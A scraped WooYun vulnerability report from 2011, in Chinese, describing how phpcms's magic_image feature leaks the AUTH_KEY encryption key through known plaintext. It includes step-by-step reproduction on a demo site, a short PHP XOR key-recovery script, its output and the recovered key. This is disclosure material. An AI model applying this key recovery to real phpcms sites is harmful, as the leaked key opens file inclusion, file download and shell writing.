{"id": 22924, "wybug_id": "wooyun-2011-01824", "wybug_title": "phpcms的另一个phpcms_auth函数的加密密钥AUTH_KEY泄漏漏洞", "wybug_corp": "盛大网络", "wybug_author": "c4rp3nt3r", "wybug_date": "2011-04-05 19:03", "wybug_open_date": "2011-05-06 00:00", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-04-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-05-06：\t细节向公众公开  简要描述： phpcms的另一个phpcms_auth函数的加密密钥AUTH_KEY泄漏漏洞by c4rp3nt3r@0x50sec.orgphpcms又一个鸡肋，有木有～～～我只是证明漏洞的存在phpcms的phpcms_auth函数的加密密钥AUTH_KEY泄漏会导致本地包含任意文件下载等多个漏洞。而对phpcms2008有的本地包含又可以导致直接写shell和删除文件。所以泄漏了phpcms的phpcms_auth函数的加密密钥AUTH_KEY就可能直接导致被秒杀。《phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞》http://www.wooyun.org/bugs/wooyun-2010-01795已经说明了两个破解\"phpcms_auth函数的加密密钥AUTH_KEY\"的方法，但是还不是很理想，最理想的是直接给我们足够的明文和密文。是的开放的phpcms真的给我们这样的了，没有保留。上一篇说到\"破解了这个函数之后，一方面反而更加不安全了，另一方面所有建立在这个函数之上的机制可能都会受到攻击。\"其实一切建立在这个函数上的代码都可能给我们机会破解这个密钥。 详细说明：  phpcms的另一个phpcms_auth函数的加密密钥AUTH_KEY泄漏漏洞phpcms的phpcms_auth函数的加密密钥AUTH_KEY泄漏会导致本地包含任意文件下载等多个漏洞。而对phpcms2008有的本地包含又可以导致直接写shell和删除文件。所以泄漏了phpcms的phpcms_auth函数的加密密钥AUTH_KEY就可能直接导致被秒杀。《phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞》 WooYun: phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞 已经说明了两个破解\"phpcms_auth函数的加密密钥AUTH_KEY\"的方法，但是还不是很理想，最理想的是直接给我们足够的明文和密文。是的开放的phpcms真的给我们这样的了，没有保留。上一篇说到\"破解了这个函数之后，一方面反而更加不安全了，另一方面所有建立在这个函数之上的机制可能都会受到攻击。\"其实一切建立在这个函数上的代码都可能给我们机会破解这个密钥。来看magic_image函数，主要作用就是将字符串生成一个图片，这样做应该是为了防止别人采集网站上的数据，或者是防止泄漏隐私。\n// include global.fun.phpfunction magic_image($txt, $fonttype = 4){\tif(empty($txt)) return false;\tif(function_exists(\"imagepng\"))\t{\t\t$txt = urlencode(phpcms_auth($txt, 'ENCODE', AUTH_KEY));\t\t$txt = '<img src=\"'.PHPCMS_PATH.'magic_image.php?gd=1&fonttype='.$fonttype.'&txt='.$txt.'\" align=\"absmiddle\">';\t}\treturn $txt;}\n在招聘、供求信息、跳蚤市场等多个功能模块都用到了这个函数。而且像供求信息、跳蚤市场貌似普通注册用户就能发贴。发贴的时候在电话号码或邮箱那的字符就会被magic_image函数加密，显示给用户的时候又会调用magic_image.php文件，对字符串解密并进行生成图片。就是说：我们可以自定义明文并且我们也可以得到明文加密后的密文这就意味这我们可以得到全部密文(只要电话或邮箱的长度大于20位即可)，不费什么力气。--------------------举例说明1.在http://demo.phpcms.cn随便注册个普通用户会员2.在跳蚤市场那http://demo.phpcms.cn/info/sale/随便点开一个信息页点右侧的 【免费发布信息】 http://demo.phpcms.cn/contribute.php?catid=22随便发一条信息使用邮箱为mailc4rp3nt3r@gmail.com3.最后找到我们发布的信息:http://demo.phpcms.cn/2011/0405/366.html查看邮箱图片的地址http://demo.phpcms.cn/magic_image.php?gd=1&fonttype=4&txt=ADcCAw9wKjtaOhNGAS0uPQorC14OOQY%3D--------------------好了明文:mailc4rp3nt3r@gmail.com密文:ADcCAw9wKjtaOhNGAS0uPQorC14OOQY%3D解密一下:\n<?php$key=\"mailc4rp3nt3r@gmail.com\";$txt='ADcCAw9wKjtaOhNGAS0uPQorC14OOQY%3D';$txt=base64_decode(urldecode($txt));for($i=0;$i<strlen($key);$i++){\t\t$code  .= $txt[$i] ^ $key[$i];}echo $code;?>\n运行结果:$ php /var/www/vul.phpOXdcFVodxAcbCUeTgLBgOXdc我们的密钥就是：OXdcFVodxAcbCUeTgLBg   漏洞证明：  http://demo.phpcms.cn/ 此站密钥为 OXdcFVodxAcbCUeTgLBg   修复方案：  略   版权声明：转载请注明来源 c4rp3nt3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2011-04-06 10:07 厂商回复： 谢谢c4rp3nt3r提交漏洞信息。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-04-05 19:05 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  这就意味这我们可以得到全部密文(只要电话或邮箱的长度大于20位即可)，不费什么力气。应为：这就意味这我们可以得到全部密钥(只要电话或邮箱的长度大于20位即可)，不费什么力气。phpcms2008 sp2 or sp4版本没仔细看    \n     2011-04-05 23:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  介个哥哥好深入    \n     2011-05-03 20:32 |    \t\tsaga \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 世界上只有10种人，懂二进制的，和不懂二进...)\t\t \n  介个锅锅好认真阿,上回才给5r.    \n     2011-05-06 11:21 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  伤不起啊～～～    \n     2011-05-06 14:40 |    \t\tJ4nker \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:35        | I have a dream)\t\t \n  伤不起啊～～很深入啊…     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}